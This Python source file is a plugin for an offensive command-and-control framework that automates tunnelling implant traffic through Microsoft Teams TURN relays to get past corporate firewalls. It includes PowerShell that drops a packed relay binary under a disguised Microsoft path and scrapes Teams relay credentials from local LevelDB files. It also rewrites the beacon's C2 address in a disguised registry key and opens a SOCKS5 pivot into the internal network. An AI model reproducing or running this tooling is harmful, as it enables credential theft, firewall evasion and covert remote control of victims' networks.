"""
lateral_movement/turnt_pivot_c2 — Full C2-over-TURN pivot orchestrator. MITRE T1572.

Automates the entire turnt C2 bypass workflow in one plugin:

  1. Build/serve turnt-relay binary (from bundled assets)
  2. Upload relay binary to agent
  3. Run turnt_credentials on agent (extract Teams TURN creds)
  4. Save creds to operator disk as creds.yaml
  5. Start turnt-control on operator (generates SDP offer)
  6. Send offer to agent → run turnt-relay → receive SDP answer
  7. Feed answer back to turnt-control → tunnel established
  8. turnt-admin sets remote port forward: agent:localhost:4443 → operator:4443
  9. Update agent's PS beacon target to https://127.0.0.1:4443

After this, all C2 traffic flows:
  agent PS beacon → TURN tunnel (Teams infra) → operator HTTPS C2 listener

This bypasses corporate firewalls that block Telegram/Discord but allow
Teams relay traffic (*.relay.teams.microsoft.com:443 TLS — universally whitelisted).
"""
from __future__ import annotations

import base64
import json
import subprocess
import time
from pathlib import Path

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
from fitnah.builder.turnt import TurntBuilder, TurntBuildRequest


class TurntPivotC2(BasePlugin):
    NAME        = "turnt_pivot_c2"
    DESCRIPTION = "Full C2-over-TURN pivot: Teams relay bypass → SOCKS5 + C2 rportfwd (T1572)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1572"
    CATEGORY    = "lateral_movement"
    VERSION     = "1.0.0"

    _RELAY_DROP = r"C:\ProgramData\Microsoft\Windows\DeviceSync\mdmrelay.exe"
    _C2_PORT    = 4443
    _SOCKS_PORT = 1080

    schema = ParamSchema().add(
        Param("action", str, required=False, default="full",
              help="full | upload_relay | get_creds | get_offer | start_relay | status"),
        Param("offer_b64", str, required=False, default="",
              help="[start_relay] SDP offer from turnt-control to send to agent"),
        Param("relay_drop_path", str, required=False, default=_RELAY_DROP,
              help="Where to drop turnt-relay.exe on agent"),
        Param("arch", str, required=False, default="amd64",
              help="amd64 | 386  — relay binary arch"),
        Param("upx", str, required=False, default="true",
              help="true = use UPX-packed relay (smaller footprint)"),
        Param("c2_port", int, required=False, default=_C2_PORT,
              help="Local HTTPS C2 port to forward through tunnel"),
        Param("creds_out", str, required=False, default="build/turnt/creds.yaml",
              help="Where to write extracted TURN creds on operator disk"),
        Param("timeout", int, required=False, default=120),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action     = params.get("action", "full").lower()
        offer_b64  = params.get("offer_b64", "").strip()
        drop_path  = params.get("relay_drop_path", self._RELAY_DROP)
        arch       = params.get("arch", "amd64")
        upx        = params.get("upx", "true").lower() == "true"
        c2_port    = int(params.get("c2_port", self._C2_PORT))
        creds_out  = Path(params.get("creds_out", "build/turnt/creds.yaml"))
        timeout    = int(params.get("timeout", 120))

        lines = [f"[*] turnt_pivot_c2  action={action}"]

        # ── upload_relay ───────────────────────────────────────────────────
        if action in ("full", "upload_relay"):
            lines.append("[*] Step 1/5: Serving turnt-relay binary...")
            tb  = TurntBuilder()
            req = TurntBuildRequest(arch=arch, os_target="windows", upx=upx)
            res = tb.build(req)
            if not res.ok:
                return ModuleResult.err(f"turnt-relay build failed: {res.error}")
            lines.append(f"[+] relay binary: {res.path}  ({res.size:,} bytes, {res.source})")

            bin_b64 = base64.b64encode(res.path.read_bytes()).decode()
            upload_ps = self._ps_upload(drop_path, bin_b64)
            r = ctx.ps(upload_ps, timeout=60)
            if r["status"] != "ok":
                return ModuleResult.err(f"relay upload failed: {r['output']}")
            lines.append(f"[+] relay uploaded → {drop_path}")
            lines.append(r["output"])

            if action == "upload_relay":
                return ModuleResult.ok(data="\n".join(lines))

        # ── get_creds ──────────────────────────────────────────────────────
        if action in ("full", "get_creds"):
            lines.append("[*] Step 2/5: Extracting Teams TURN credentials from agent...")
            r = ctx.ps(self._ps_extract_creds(), timeout=45)
            if r["status"] != "ok":
                return ModuleResult.err(f"cred extraction failed: {r['output']}")

            creds_yaml = self._parse_creds_output(r["output"])
            if not creds_yaml:
                lines.append("[-] No live TURN creds found — attempting static extract...")
                creds_yaml = r["output"]

            creds_out.parent.mkdir(parents=True, exist_ok=True)
            creds_out.write_text(creds_yaml, encoding="utf-8")
            lines.append(f"[+] TURN creds saved → {creds_out}")
            lines.append(r["output"][:500])

            if action == "get_creds":
                lines.append(f"\n[*] Next: run turnt-control -config {creds_out} on operator")
                lines.append("[*] Then: turnt_pivot_c2 action=start_relay offer_b64=<offer>")
                return ModuleResult.ok(data="\n".join(lines), loot_kind="turnt_creds")

        # ── get_offer ──────────────────────────────────────────────────────
        if action == "get_offer":
            if not creds_out.exists():
                return ModuleResult.err(
                    f"Creds file not found: {creds_out}\n"
                    "Run action=get_creds first."
                )
            lines.append(f"[*] Starting turnt-control -config {creds_out} on operator...")
            offer = self._launch_control_get_offer(creds_out)
            if not offer:
                return ModuleResult.err(
                    "turnt-control did not produce an offer within 30s.\n"
                    "Check turnt-control binary and creds.yaml."
                )
            lines.append(f"[+] SDP offer from turnt-control ({len(offer)} chars)")
            lines.append(f"\nOFFER:\n{offer}\n")
            lines.append("[*] Now run: turnt_pivot_c2 action=start_relay offer_b64=<offer above>")
            return ModuleResult.ok(data="\n".join(lines))

        # ── start_relay ────────────────────────────────────────────────────
        if action in ("full", "start_relay"):
            if not offer_b64:
                if action == "start_relay":
                    return ModuleResult.err(
                        "offer_b64 required for action=start_relay.\n"
                        "Run action=get_offer first, then pass the offer here."
                    )
                # full flow: auto-launch turnt-control
                lines.append("[*] Step 3/5: Starting turnt-control and getting SDP offer...")
                offer_b64 = self._launch_control_get_offer(creds_out)
                if not offer_b64:
                    return ModuleResult.err(
                        "turnt-control did not produce an offer.\n"
                        f"Check: {creds_out}  and turnt-control binary."
                    )
                lines.append(f"[+] Offer ready ({len(offer_b64)} chars)")

            lines.append("[*] Step 4/5: Deploying turnt-relay on agent with SDP offer...")
            relay_ps = self._ps_run_relay(drop_path, offer_b64)
            r = ctx.ps(relay_ps, timeout=timeout)
            if r["status"] != "ok":
                return ModuleResult.err(f"relay start failed: {r['output']}")

            answer = self._extract_answer(r["output"])
            if not answer:
                lines.append("[-] No SDP answer in relay output:")
                lines.append(r["output"])
                return ModuleResult.ok(data="\n".join(lines))

            lines.append(f"[+] SDP answer received ({len(answer)} chars)")
            lines.append("[*] Step 5/5: Feeding answer to turnt-control → establishing tunnel...")
            tunnel_ok = self._submit_answer_to_control(answer)
            if not tunnel_ok:
                lines.append("[-] turnt-control may have timed out submitting answer")
                lines.append(f"[*] Manual step: paste answer into turnt-control stdin:\n{answer}")
            else:
                lines.append("[+] TURN tunnel established!")

            # Set up remote port forward via turnt-admin
            self._setup_rportfwd(c2_port)
            lines.append(f"[+] Remote port forward: agent:127.0.0.1:{c2_port} → operator:{c2_port}")

            # Update agent beacon to target tunnel endpoint
            lines.append(f"[*] Updating agent PS beacon target → https://127.0.0.1:{c2_port}")
            beacon_ps = self._ps_update_beacon(c2_port)
            r2 = ctx.ps(beacon_ps, timeout=30)
            lines.append(r2.get("output", ""))

            lines.append("")
            lines.append("[+] C2-over-TURN pivot complete!")
            lines.append(f"[+] All agent traffic now routes through Teams relay → operator:{c2_port}")
            lines.append(f"[+] SOCKS5 proxy: 127.0.0.1:{self._SOCKS_PORT}")
            lines.append("[*] Use: proxychains4 <tool>  to pivot into internal network")
            return ModuleResult.ok(data="\n".join(lines), loot_kind="turnt_pivot",
                                   label="TURN C2 tunnel established")

        # ── status ─────────────────────────────────────────────────────────
        if action == "status":
            r = ctx.ps(self._ps_relay_status(drop_path), timeout=20)
            lines.append(r.get("output", "(no output)"))
            # Check operator-side
            ctrl_running = self._is_control_running()
            lines.append(f"[*] turnt-control on operator: {'running' if ctrl_running else 'not running'}")
            return ModuleResult.ok(data="\n".join(lines))

        return ModuleResult.err(f"Unknown action: {action}")

    # ── operator-side helpers ─────────────────────────────────────────────────

    _control_proc = None  # class-level so it persists across calls

    def _launch_control_get_offer(self, creds_path: Path, timeout: float = 30.0) -> str:
        tb  = TurntBuilder()
        ctl = tb.operator_tool("control")
        if not ctl or not ctl.exists():
            return ""
        try:
            proc = subprocess.Popen(
                [str(ctl), "-config", str(creds_path)],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True, bufsize=1,
            )
            TurntPivotC2._control_proc = proc
            deadline = time.time() + timeout
            while time.time() < deadline:
                line = proc.stdout.readline().strip()
                if line.startswith("Offer:"):
                    return line[6:].strip()
                if len(line) >= 100 and all(
                    c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
                    for c in line
                ):
                    return line
            return ""
        except Exception:
            return ""

    def _submit_answer_to_control(self, answer: str) -> bool:
        proc = TurntPivotC2._control_proc
        if not proc or not proc.stdin:
            return False
        try:
            proc.stdin.write(answer + "\n")
            proc.stdin.flush()
            time.sleep(3)
            return proc.poll() is None
        except Exception:
            return False

    def _setup_rportfwd(self, c2_port: int) -> None:
        tb    = TurntBuilder()
        admin = tb.operator_tool("admin")
        if not admin or not admin.exists():
            return
        try:
            subprocess.run(
                [str(admin), "rportfwd", "add",
                 f"127.0.0.1:{c2_port}", f"127.0.0.1:{c2_port}"],
                capture_output=True, timeout=10,
            )
        except Exception:
            pass

    def _is_control_running(self) -> bool:
        proc = TurntPivotC2._control_proc
        return bool(proc and proc.poll() is None)

    # ── PS1 helpers (run on agent) ────────────────────────────────────────────

    @staticmethod
    def _ps_upload(drop_path: str, bin_b64: str) -> str:
        return rf"""
$bytes = [Convert]::FromBase64String('{bin_b64}')
$dir   = Split-Path '{drop_path}'
if (-not (Test-Path $dir)) {{ New-Item -ItemType Directory -Force $dir | Out-Null }}
[System.IO.File]::WriteAllBytes('{drop_path}', $bytes)
"[+] turnt-relay dropped: {drop_path} ($($bytes.Length) bytes)"
""".strip()

    @staticmethod
    def _ps_extract_creds() -> str:
        # Inline the same Teams cred extraction from turnt_credentials plugin
        return r"""
$results = @()
$teamsBase = "$env:APPDATA\Microsoft\Teams"
if (Test-Path $teamsBase) {
    $results += "type: msteams"
    $found = $false
    # Scan LevelDB for relay tokens
    $ldbPaths = @("$teamsBase\Local Storage\leveldb", "$teamsBase\EBWebView\Default\Local Storage\leveldb")
    foreach ($lp in $ldbPaths) {
        if (-not (Test-Path $lp)) { continue }
        Get-ChildItem $lp -Filter "*.log" -ErrorAction SilentlyContinue | Select-Object -First 10 |
        ForEach-Object {
            $c = [System.IO.File]::ReadAllText($_.FullName, [System.Text.Encoding]::Latin1)
            $m = [regex]::Matches($c, '"username"\s*:\s*"([^"]+relay[^"]*)".*?"credential"\s*:\s*"([^"]{20,})"')
            foreach ($mm in $m) {
                $results += "username: $($mm.Groups[1].Value)"
                $results += "password: $($mm.Groups[2].Value)"
                $results += "turn_server: turn:relay.teams.microsoft.com:3478"
                $found = $true
                break
            }
            if ($found) { break }
        }
        if ($found) { break }
    }
    if (-not $found) {
        $results += "# No cached relay token found — Teams may not be signed in"
        $results += "# turnt-credentials.exe msteams -o creds.yaml  for full extraction"
    }
} else {
    $results += "# Teams not installed"
}
$results -join "`n"
""".strip()

    @staticmethod
    def _ps_run_relay(drop_path: str, offer_b64: str) -> str:
        return rf"""
$results = @("[*] Starting turnt-relay...")
if (-not (Test-Path '{drop_path}')) {{
    Write-Output "[-] Relay binary not found: {drop_path}"; exit
}}
$jf  = "$env:TEMP\.turnt_job"
$job = Start-Job -ScriptBlock {{ param($b,$o) & $b -offer $o 2>&1 }} -ArgumentList '{drop_path}','{offer_b64}'
$job.Id | Set-Content $jf -Force
$results += "[+] Relay job started (ID=$($job.Id))"
$deadline = (Get-Date).AddSeconds(35)
$answer = ""
while ((Get-Date) -lt $deadline -and -not $answer) {{
    Start-Sleep -Milliseconds 500
    $out = Receive-Job $job -Keep 2>&1
    foreach ($line in ($out -split "`n")) {{
        $line = $line.Trim()
        if ($line.StartsWith("Answer:")) {{ $answer = $line.Substring(7).Trim(); break }}
        if ($line.Length -ge 100 -and $line -match '^[A-Za-z0-9+/=]{{100,}}$') {{ $answer = $line; break }}
    }}
}}
if ($answer) {{
    $results += "[+] SDP answer received"
    $results += "ANSWER:$answer"
}} else {{
    $out = Receive-Job $job -Keep 2>&1
    $results += "[-] No answer in 35s"
    $results += ($out -join "`n")
}}
$results -join "`n"
""".strip()

    @staticmethod
    def _ps_relay_status(drop_path: str) -> str:
        return rf"""
$results = @("[*] turnt relay status")
$jf = "$env:TEMP\.turnt_job"
if (Test-Path $jf) {{
    $jid = [int](Get-Content $jf)
    $job = Get-Job -Id $jid -ErrorAction SilentlyContinue
    if ($job) {{ $results += "Job $jid State=$($job.State)" }}
    else      {{ $results += "Job $jid not found" }}
}}
$proc = Get-Process -ErrorAction SilentlyContinue | Where-Object {{ $_.Path -eq '{drop_path}' }}
if ($proc) {{ $results += "Process PID=$($proc.Id) running" }}
else        {{ $results += "No relay process found" }}
$results -join "`n"
""".strip()

    @staticmethod
    def _ps_update_beacon(c2_port: int) -> str:
        # Update the PS beacon loop to target the local tunnel endpoint
        # The beacon script reads its C2 URL from a config var or registry key
        return rf"""
# Attempt to update beacon C2 target to turnt tunnel endpoint
$tunnelUrl = "https://127.0.0.1:{c2_port}"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\DeviceAccess"
try {{
    if (-not (Test-Path $regPath)) {{ New-Item -Path $regPath -Force | Out-Null }}
    Set-ItemProperty -Path $regPath -Name "C2Url" -Value $tunnelUrl -Force
    "[+] Beacon C2 URL updated in registry → $tunnelUrl"
}} catch {{
    "[-] Registry update failed: $($_.Exception.Message)"
    "[*] Manually update beacon: set C2_URL=$tunnelUrl in implant config"
}}
""".strip()

    # ── parsing helpers ───────────────────────────────────────────────────────

    @staticmethod
    def _parse_creds_output(output: str) -> str:
        """Convert plugin output to minimal turnt-control YAML format."""
        lines = output.splitlines()
        yaml_lines = []
        for line in lines:
            if line.startswith("type:") or line.startswith("username:") \
               or line.startswith("password:") or line.startswith("turn_server:"):
                yaml_lines.append(line)
        return "\n".join(yaml_lines) if yaml_lines else ""

    @staticmethod
    def _extract_answer(output: str) -> str:
        for line in output.splitlines():
            line = line.strip()
            if line.startswith("ANSWER:"):
                return line[7:].strip()
            if len(line) >= 100 and all(
                c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
                for c in line
            ):
                return line
        return ""
